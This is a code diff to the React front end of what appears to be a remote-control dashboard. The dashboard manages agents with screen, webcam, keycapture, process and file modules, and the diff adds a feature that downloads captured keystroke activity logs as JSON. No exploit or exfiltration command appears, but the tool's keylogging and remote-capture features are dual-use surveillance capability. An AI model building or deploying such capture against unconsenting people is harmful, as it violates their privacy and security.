@@ -96,6 +96,7 @@ export function App() {
   const manualAgentSelectionRef = useRef(false);
   const selectedAgent = useMemo(() => agents.find((agent) => agent.id === selectedAgentId) ?? agents[0], [agents, selectedAgentId]);
   const downloadedCommandIds = useRef<Set<string>>(new Set());
+  const exportedActivityCommandIds = useRef<Set<string>>(new Set());
   const downloadEffectsReady = useRef(false);
   const keycaptureActive = useMemo(() => {
     const latestStateCommand = commands.find(
@@ -123,6 +124,7 @@ export function App() {
     if (!downloadEffectsReady.current) {
       for (const command of commands) {
         if (command.type === "files.download") downloadedCommandIds.current.add(command.id);
+        if (command.type === "activity.export") exportedActivityCommandIds.current.add(command.id);
       }
       downloadEffectsReady.current = true;
       return;
@@ -133,6 +135,11 @@ export function App() {
         const key = streamStateKey(command.agent_id, stream);
         setStreamFrames((frames) => ({ ...frames, [key]: null }));
         setStreamStats((stats) => ({ ...stats, [key]: { ...emptyStreamStats, status: "idle" } }));
+      }
+      if (command.type === "activity.export" && command.status === "succeeded" && command.result && !exportedActivityCommandIds.current.has(command.id)) {
+        exportedActivityCommandIds.current.add(command.id);
+        const exported = downloadActivityExport(command.result, command.created_at);
+        setNotice(exported.ok ? `Downloaded ${exported.name}.` : exported.error);
       }
       if (command.type !== "files.download" || command.status !== "succeeded" || !command.result || downloadedCommandIds.current.has(command.id)) continue;
       downloadedCommandIds.current.add(command.id);
@@ -256,6 +263,7 @@ export function App() {
     setStreamStats({});
     setActivityEvents({});
     downloadedCommandIds.current.clear();
+    exportedActivityCommandIds.current.clear();
     downloadEffectsReady.current = false;
     setNotice("Signed out. Sign in to the live gateway for real agent enrollment.");
   }
@@ -675,7 +683,7 @@ function ModuleSurface({
   const previewRef = useRef<HTMLDivElement | null>(null);
   const canFullscreenPreview = module.id === "screen" || module.id === "webcam";
   const isLiveModule = module.id === "screen" || module.id === "webcam";
-  const isDataModule = ["applications", "processes", "files"].includes(module.id);
+  const isDataModule = ["applications", "processes", "files", "keycapture"].includes(module.id);
   const activeStream = isLiveModule ? (module.id as StreamKind) : null;
   const activeStreamKey = selectedAgent && activeStream ? streamStateKey(selectedAgent.id, activeStream) : null;
   const activeStats = activeStreamKey ? streamStats[activeStreamKey] ?? emptyStreamStats : emptyStreamStats;
@@ -741,8 +749,8 @@ function ModuleSurface({
               </div>
             </div>
           )}
-          <ResultView moduleId={module.id} command={latestCommand} runCommand={runCommand} />
           {module.id === "keycapture" && <LiveActivityFeed events={activityEvents} />}
+          <ResultView moduleId={module.id} command={latestCommand} runCommand={runCommand} />
         </div>
       </div>
     </>
@@ -865,6 +873,7 @@ function ResultView({ moduleId, command, runCommand }: { moduleId: string; comma
   if (moduleId === "files") return <FilesResult result={command.result} runCommand={runCommand} />;
   if (moduleId === "screen" || moduleId === "webcam") return <MediaResult command={command} />;
   if (moduleId === "power") return <PowerResult result={command.result} />;
+  if (moduleId === "keycapture" && command.type === "activity.export") return <div className="state-card"><strong>Activity export downloaded</strong><p>The current session log was saved to the browser download folder.</p></div>;
   if (moduleId === "keycapture") return <KeyCaptureResult result={command.result} />;
   return <DeveloperDetails result={command.result} />;
 }
@@ -1308,6 +1317,24 @@ function downloadCommandResult(result: Record<string, unknown>): { ok: true; nam
   }
 }
 
+function downloadActivityExport(result: Record<string, unknown>, createdAt: string): { ok: true; name: string } | { ok: false; error: string } {
+  try {
+    const timestamp = new Date(createdAt).toISOString().replace(/[:.]/g, "-");
+    const name = `remotectrl-activity-${timestamp}.json`;
+    const payload = JSON.stringify({ exported_at: new Date().toISOString(), events: asRecords(result.events) }, null, 2);
+    const url = URL.createObjectURL(new Blob([payload], { type: "application/json" }));
+    const link = document.createElement("a");
+    link.href = url;
+    link.download = name;
+    document.body.appendChild(link);
+    link.click();
+    link.remove();
+    URL.revokeObjectURL(url);
+    return { ok: true, name };
+  } catch (error) {
+    return { ok: false, error: error instanceof Error ? error.message : "Browser download failed." };
+  }
+}
 function agentName(agents: Agent[], agentId: string): string {
   return agents.find((agent) => agent.id === agentId)?.name ?? "Unknown agent";
 }
